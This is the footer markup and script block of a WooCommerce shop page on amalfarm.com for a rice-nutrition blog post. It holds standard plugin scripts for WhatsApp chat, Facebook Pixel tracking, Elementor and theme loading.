<li id="accordion-menu-item-783" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children has-sub"><a href="https://www.amalfarm.com/shop/">Shop</a>
<span aria-label="Open Submenu" class="arrow" role="button"></span><ul class="sub-menu">
	<li id="accordion-menu-item-6512" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/festival-gift/">Festival Gift</a></li>
	<li id="accordion-menu-item-3223" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/dry-fruits-and-nuts/">Dry Fruits and Nuts</a></li>
	<li id="accordion-menu-item-7398" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/odop/">ODOP</a></li>
	<li id="accordion-menu-item-3225" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/rice-and-poha/">Rice and Poha</a></li>
	<li id="accordion-menu-item-3226" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/spices/">Spices</a></li>
	<li id="accordion-menu-item-3224" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/tester-packs/">Tester Packs</a></li>
	<li id="accordion-menu-item-6185" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat"><a href="https://www.amalfarm.com/product-category/flour-and-pulses/">Flour and pulses</a></li>
</ul>
</li>
<li id="accordion-menu-item-781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children has-sub"><a href="https://www.amalfarm.com/blog/">Blog</a>
<span aria-label="Open Submenu" class="arrow" role="button"></span><ul class="sub-menu">
	<li id="accordion-menu-item-6198" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent active"><a href="https://www.amalfarm.com/category/food/">Food</a></li>
	<li id="accordion-menu-item-6199" class="menu-item menu-item-type-taxonomy menu-item-object-category"><a href="https://www.amalfarm.com/category/news/">News</a></li>
</ul>
</li>
<li id="accordion-menu-item-3254" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/farmer-story/">Farmer Story</a></li>
<li id="accordion-menu-item-810" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/contact-us/">Contact Us</a></li>
<li id="accordion-menu-item-9007" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://www.amalfarm.com/my-account/"><i class="fa fa-regular fa-user"></i>Login</a></li>
</ul></div></div>

		<script>
			window.RS_MODULES = window.RS_MODULES || {};
			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
			window.RS_MODULES.defered = true;
			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
			window.RS_MODULES.type = 'compiled';
		</script>
		<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/porto-child/*","/wp-content/themes/porto/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<!-- Click to Chat - https://holithemes.com/plugins/click-to-chat/  v4.11 -->  
            <div class="ht-ctc ht-ctc-chat ctc-analytics ctc_wp_desktop style-3  " id="ht-ctc-chat"  
                style="display: none;  position: fixed; bottom: 15px; left: 5%;"   >
                                <div class="ht_ctc_style ht_ctc_chat_style">
                <div  style="display:flex;justify-content:center;align-items:center; " class="ctc_s_3 ctc_nb" data-nb_top="-5px" data-nb_right="-5px">
    <p class="ctc-analytics ctc_cta ctc_cta_stick ht-ctc-cta  ht-ctc-cta-hover " style="padding: 0px 16px; line-height: 1.6; font-size: 15px; background-color: #25d366; color: #ffffff; border-radius:10px; margin:0 10px;  display: none; order: 1; ">Have a question?</p>
    <svg style="pointer-events:none; display:block; height:50px; width:50px;" width="50px" height="50px" viewBox="0 0 1219.547 1225.016">
            <path style="fill: #E0E0E0;" fill="#E0E0E0" d="M1041.858 178.02C927.206 63.289 774.753.07 612.325 0 277.617 0 5.232 272.298 5.098 606.991c-.039 106.986 27.915 211.42 81.048 303.476L0 1225.016l321.898-84.406c88.689 48.368 188.547 73.855 290.166 73.896h.258.003c334.654 0 607.08-272.346 607.222-607.023.056-162.208-63.052-314.724-177.689-429.463zm-429.533 933.963h-.197c-90.578-.048-179.402-24.366-256.878-70.339l-18.438-10.93-191.021 50.083 51-186.176-12.013-19.087c-50.525-80.336-77.198-173.175-77.16-268.504.111-278.186 226.507-504.503 504.898-504.503 134.812.056 261.519 52.604 356.814 147.965 95.289 95.36 147.728 222.128 147.688 356.948-.118 278.195-226.522 504.543-504.693 504.543z"/>
            <linearGradient id="htwaicona-chat" gradientUnits="userSpaceOnUse" x1="609.77" y1="1190.114" x2="609.77" y2="21.084">
                <stop offset="0" stop-color="#20b038"/>
                <stop offset="1" stop-color="#60d66a"/>
            </linearGradient>
            <path style="fill: url(#htwaicona-chat);" fill="url(#htwaicona-chat)" d="M27.875 1190.114l82.211-300.18c-50.719-87.852-77.391-187.523-77.359-289.602.133-319.398 260.078-579.25 579.469-579.25 155.016.07 300.508 60.398 409.898 169.891 109.414 109.492 169.633 255.031 169.57 409.812-.133 319.406-260.094 579.281-579.445 579.281-.023 0 .016 0 0 0h-.258c-96.977-.031-192.266-24.375-276.898-70.5l-307.188 80.548z"/>
            <image overflow="visible" opacity=".08" width="682" height="639" transform="translate(270.984 291.372)"/>
            <path fill-rule="evenodd" clip-rule="evenodd" style="fill: #FFFFFF;" fill="#FFF" d="M462.273 349.294c-11.234-24.977-23.062-25.477-33.75-25.914-8.742-.375-18.75-.352-28.742-.352-10 0-26.25 3.758-39.992 18.766-13.75 15.008-52.5 51.289-52.5 125.078 0 73.797 53.75 145.102 61.242 155.117 7.5 10 103.758 166.266 256.203 226.383 126.695 49.961 152.477 40.023 179.977 37.523s88.734-36.273 101.234-71.297c12.5-35.016 12.5-65.031 8.75-71.305-3.75-6.25-13.75-10-28.75-17.5s-88.734-43.789-102.484-48.789-23.75-7.5-33.75 7.516c-10 15-38.727 48.773-47.477 58.773-8.75 10.023-17.5 11.273-32.5 3.773-15-7.523-63.305-23.344-120.609-74.438-44.586-39.75-74.688-88.844-83.438-103.859-8.75-15-.938-23.125 6.586-30.602 6.734-6.719 15-17.508 22.5-26.266 7.484-8.758 9.984-15.008 14.984-25.008 5-10.016 2.5-18.773-1.25-26.273s-32.898-81.67-46.234-111.326z"/>
            <path style="fill: #FFFFFF;" fill="#FFF" d="M1036.898 176.091C923.562 62.677 772.859.185 612.297.114 281.43.114 12.172 269.286 12.039 600.137 12 705.896 39.633 809.13 92.156 900.13L7 1211.067l318.203-83.438c87.672 47.812 186.383 73.008 286.836 73.047h.255.003c330.812 0 600.109-269.219 600.25-600.055.055-160.343-62.328-311.108-175.649-424.53zm-424.601 923.242h-.195c-89.539-.047-177.344-24.086-253.93-69.531l-18.227-10.805-188.828 49.508 50.414-184.039-11.875-18.867c-49.945-79.414-76.312-171.188-76.273-265.422.109-274.992 223.906-498.711 499.102-498.711 133.266.055 258.516 52 352.719 146.266 94.195 94.266 146.031 219.578 145.992 352.852-.118 274.999-223.923 498.749-498.899 498.749z"/>
        </svg></div>                </div>
            </div>
                        <span class="ht_ctc_chat_data" 
                data-no_number=""
                data-settings="{&quot;number&quot;:&quot;919625576376&quot;,&quot;pre_filled&quot;:&quot;&quot;,&quot;dis_m&quot;:&quot;show&quot;,&quot;dis_d&quot;:&quot;show&quot;,&quot;css&quot;:&quot;display: none; cursor: pointer; z-index: 99999999;&quot;,&quot;pos_d&quot;:&quot;position: fixed; bottom: 15px; left: 5%;&quot;,&quot;pos_m&quot;:&quot;position: fixed; bottom: 10px; left: 10px;&quot;,&quot;schedule&quot;:&quot;no&quot;,&quot;se&quot;:150,&quot;ani&quot;:&quot;no-animations&quot;,&quot;url_target_d&quot;:&quot;_blank&quot;,&quot;ga&quot;:&quot;yes&quot;,&quot;fb&quot;:&quot;yes&quot;,&quot;g_init&quot;:&quot;default&quot;,&quot;g_an_event_name&quot;:&quot;chat: {number}&quot;,&quot;pixel_event_name&quot;:&quot;Click to Chat by HoliThemes&quot;}" 
            ></span>
            			<!-- Facebook Pixel Code -->
			<noscript>
				<img
					height="1"
					width="1"
					style="display:none"
					alt="fbpx"
					src="https://www.facebook.com/tr?id=501581500892852&ev=PageView&noscript=1"
				/>
			</noscript>
			<!-- End Facebook Pixel Code -->
				<script>
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
				<!-- Facebook Pixel Event Code -->
			<script  type="text/javascript">
				document.addEventListener( 'wpcf7submit', function (event) {
				fbq('init', '501581500892852', "" || { em: event.detail.inputs.filter(ele => ele.name.includes("email"))[0].value } || "", {
    "agent": "woocommerce_0-9.4.5-3.7.0"
});
/* WooCommerce Facebook Integration Event Tracking */
fbq('set', 'agent', 'woocommerce_0-9.4.5-3.7.0', '501581500892852');
fbq('track', 'Lead', {
    "source": "woocommerce_0",
    "version": "9.4.5",
    "pluginVersion": "3.7.0"
});				}, false );
			</script>
			<!-- End Facebook Pixel Event Code -->
			<script id="ht_ctc_app_js-js-extra">
var ht_ctc_chat_var = {"number":"919625576376","pre_filled":"","dis_m":"show","dis_d":"show","css":"display: none; cursor: pointer; z-index: 99999999;","pos_d":"position: fixed; bottom: 15px; left: 5%;","pos_m":"position: fixed; bottom: 10px; left: 10px;","schedule":"no","se":"150","ani":"no-animations","url_target_d":"_blank","ga":"yes","fb":"yes","g_init":"default","g_an_event_name":"chat: {number}","pixel_event_name":"Click to Chat by HoliThemes"};
var ht_ctc_variables = {"g_an_event_name":"chat: {number}","pixel_event_type":"trackCustom","pixel_event_name":"Click to Chat by HoliThemes","g_an_params":["g_an_param_1","g_an_param_2","g_an_param_3"],"g_an_param_1":{"key":"number","value":"{number}"},"g_an_param_2":{"key":"title","value":"{title}"},"g_an_param_3":{"key":"url","value":"{url}"},"pixel_params":["pixel_param_1","pixel_param_2","pixel_param_3","pixel_param_4"],"pixel_param_1":{"key":"Category","value":"Click to Chat for WhatsApp"},"pixel_param_2":{"key":"ID","value":"{number}"},"pixel_param_3":{"key":"Title","value":"{title}"},"pixel_param_4":{"key":"URL","value":"{url}"}};
//# sourceURL=ht_ctc_app_js-js-extra
</script>
<script id="ht_ctc_app_js-js" src="https://www.amalfarm.com/wp-content/plugins/click-to-chat-for-whatsapp/new/inc/assets/js/app.js?ver=4.11"></script>
<script id="wp-hooks-js" src="https://www.amalfarm.com/wp-includes/js/dist/hooks.min.js?ver=7496969728ca0f95732d"></script>
<script id="wp-i18n-js" src="https://www.amalfarm.com/wp-includes/js/dist/i18n.min.js?ver=781d11515ad3d91786ec"></script>
<script id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
//# sourceURL=wp-i18n-js-after
</script>
<script id="swv-js" src="https://www.amalfarm.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.9.8"></script>
<script id="contact-form-7-js-extra">
var wpcf7 = {"api":{"root":"https://www.amalfarm.com/wp-json/","namespace":"contact-form-7/v1"}};
//# sourceURL=contact-form-7-js-extra
</script>
<script id="contact-form-7-js" src="https://www.amalfarm.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.9.8"></script>
<script id="woocommerce-js-extra">
var woocommerce_params = {"ajax_url":"/wp-admin/admin-ajax.php","wc_ajax_url":"/?wc-ajax=%%endpoint%%"};
//# sourceURL=woocommerce-js-extra
</script>
<script data-wp-strategy="defer" id="woocommerce-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=9.4.5"></script>
<script id="wc-facebook-signals-js-extra">
var wc_facebook_signals_params = {"ajax_url":"https://www.amalfarm.com/wp-admin/admin-ajax.php","nonce":"3e2a63ab28","action":"wc_facebook_update_signals_state"};
//# sourceURL=wc-facebook-signals-js-extra
</script>
<script id="wc-facebook-signals-js" src="https://www.amalfarm.com/wp-content/plugins/facebook-for-woocommerce/assets/js/facebook-for-woocommerce-signals.js?ver=3.7.0"></script>
<script id="porto-live-search-js-extra">
var porto_live_search = {"nonce":"eda4b50498"};
//# sourceURL=porto-live-search-js-extra
</script>
<script id="porto-live-search-js" src="https://www.amalfarm.com/wp-content/themes/porto/inc/lib/live-search/live-search.min.js?ver=7.3.0"></script>
<script id="sourcebuster-js-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.min.js?ver=9.4.5"></script>
<script id="wc-order-attribution-js-extra">
var wc_order_attribution = {"params":{"lifetime":1.0e-5,"session":30,"base64":false,"ajaxurl":"https://www.amalfarm.com/wp-admin/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","utm_source_platform":"current.plt","utm_creative_format":"current.fmt","utm_marketing_tactic":"current.tct","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
//# sourceURL=wc-order-attribution-js-extra
</script>
<script id="wc-order-attribution-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.min.js?ver=9.4.5"></script>
<script id="wc-facebook-pixel-events-js" src="https://www.amalfarm.com/wp-content/plugins/facebook-for-woocommerce/assets/js/frontend/pixel-events.js?ver=3.7.0"></script>
<script id="facebook-capi-param-builder-js" src="https://unpkg.com/meta-capi-param-builder-clientjs/dist/clientParamBuilder.bundle.js?ver=3.7.0"></script>
<script id="facebook-capi-param-builder-js-after">
if (typeof clientParamBuilder !== "undefined") {
					clientParamBuilder.processAndCollectAllParams(window.location.href);
				}
//# sourceURL=facebook-capi-param-builder-js-after
</script>
<script id="googlesitekit-events-provider-contact-form-7-js" src="https://www.amalfarm.com/wp-content/plugins/google-site-kit/dist/assets/js/googlesitekit-events-provider-contact-form-7-21cf1c445673c649970d.js" defer></script>
<script id="googlesitekit-events-provider-woocommerce-js" src="https://www.amalfarm.com/wp-content/plugins/google-site-kit/dist/assets/js/googlesitekit-events-provider-woocommerce-9043ca3351c215979b62.js" defer></script>
<script id="bootstrap-js" src="https://www.amalfarm.com/wp-content/themes/porto/js/bootstrap.optimized.js?ver=5.0.1"></script>
<script data-wp-strategy="defer" defer id="jquery-cookie-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/jquery-cookie/jquery.cookie.min.js?ver=1.4.1-wc.9.4.5"></script>
<script id="owl.carousel-js" src="https://www.amalfarm.com/wp-content/themes/porto/js/libs/owl.carousel.min.js?ver=2.3.4"></script>
<script id="imagesloaded-js" src="https://www.amalfarm.com/wp-includes/js/imagesloaded.min.js?ver=5.0.0"></script>
<script id="jquery-magnific-popup-js" async="async" src="https://www.amalfarm.com/wp-content/themes/porto/js/libs/jquery.magnific-popup.min.js?ver=1.1.0"></script>
<script id="porto-theme-js-extra">
var js_porto_vars = {"rtl":"","theme_url":"https://www.amalfarm.com/wp-content/themes/porto-child","ajax_url":"https://www.amalfarm.com/wp-admin/admin-ajax.php","cart_url":"https://www.amalfarm.com/cart/","change_logo":"1","container_width":"1240","grid_gutter_width":"20","show_sticky_header":"1","show_sticky_header_tablet":"1","show_sticky_header_mobile":"1","ajax_loader_url":"//www.amalfarm.com/wp-content/themes/porto/images/ajax-loader@2x.gif","category_ajax":"","compare_popup":"","compare_popup_title":"","prdctfltr_ajax":"","slider_loop":"1","slider_autoplay":"1","slider_autoheight":"1","slider_speed":"5000","slider_nav":"","slider_nav_hover":"1","slider_margin":"","slider_dots":"1","slider_animatein":"","slider_animateout":"","product_thumbs_count":"4","product_zoom":"1","product_zoom_mobile":"1","product_image_popup":"1","zoom_type":"inner","zoom_scroll":"1","zoom_lens_size":"200","zoom_lens_shape":"square","zoom_contain_lens":"1","zoom_lens_border":"1","zoom_border_color":"#888888","zoom_border":"0","screen_xl":"1260","screen_xxl":"1400","mfp_counter":"%curr% of %total%","mfp_img_error":"\u003Ca href=\"%url%\"\u003EThe image\u003C/a\u003E could not be loaded.","mfp_ajax_error":"\u003Ca href=\"%url%\"\u003EThe content\u003C/a\u003E could not be loaded.","popup_close":"Close","popup_prev":"Previous","popup_next":"Next","request_error":"The requested content cannot be loaded.\u003Cbr/\u003EPlease try again later.","loader_text":"Loading...","submenu_back":"Back","porto_nonce":"72ddaaec1f","use_skeleton_screen":["shop","product"],"user_edit_pages":"","quick_access":"Click to edit this element.","goto_type":"Go To the Type Builder.","legacy_mode":"1","add_to_label":"Add to cart","func_url":"https://www.amalfarm.com/wp-content/plugins/porto-functionality/"};
//# sourceURL=porto-theme-js-extra
</script>
<script id="porto-theme-js" src="https://www.amalfarm.com/wp-content/themes/porto/js/theme.js?ver=7.3.0"></script>
<script id="porto-theme-async-js" async="async" src="https://www.amalfarm.com/wp-content/themes/porto/js/theme-async.js?ver=7.3.0"></script>
<script id="porto-post-ajax-modal-js" async="async" src="https://www.amalfarm.com/wp-content/themes/porto/js/post-ajax-modal.min.js?ver=7.3.0"></script>
<script id="porto-member-async-js" async="async" src="https://www.amalfarm.com/wp-content/themes/porto/js/member-async.min.js?ver=7.3.0"></script>
<script id="porto-woocommerce-theme-js" src="https://www.amalfarm.com/wp-content/themes/porto/js/woocommerce-theme.js?ver=7.3.0"></script>
<script id="facebook-for-woocommerce-inline-js-after">
/* WooCommerce Facebook Integration Event Tracking */
fbq('set', 'agent', 'woocommerce_0-9.4.5-3.7.0', '501581500892852');
fbq('track', 'PageView', {
    "source": "woocommerce_0",
    "version": "9.4.5",
    "pluginVersion": "3.7.0",
    "user_data": {}
}, {
    "eventID": "76a96bef-836c-4e44-9970-3834b3f26a2e"
});
//# sourceURL=facebook-for-woocommerce-inline-js-after
</script>
<script id="lazyload-js" src="https://www.amalfarm.com/wp-content/themes/porto/js/libs/lazyload.min.js?ver=1.9.7"></script>
<script id="elementor-webpack-runtime-js" src="https://www.amalfarm.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.24.7"></script>
<script id="elementor-frontend-modules-js" src="https://www.amalfarm.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.24.7"></script>
<script id="jquery-ui-core-js" src="https://www.amalfarm.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3"></script>
<script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":991,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":991,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":true},"version":"3.24.7","is_static":false,"experimentalFeatures":{"additional_custom_breakpoints":true,"container_grid":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"home_screen":true,"ai-layout":true,"landing-pages":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https:\/\/www.amalfarm.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/www.amalfarm.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/www.amalfarm.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"c8dda2b057"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"viewport_tablet":"991","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":10127,"title":"Rice%20Nutrition%20Facts%20100g%3A%20Complete%20Nutritional%20Guide","excerpt":"","featuredImage":"https:\/\/www.amalfarm.com\/wp-content\/uploads\/2025\/09\/rice-nutrition-fact-100gm-1024x683.png"}};
//# sourceURL=elementor-frontend-js-before
</script>
<script id="elementor-frontend-js" src="https://www.amalfarm.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.24.7"></script>
</body>
</html>
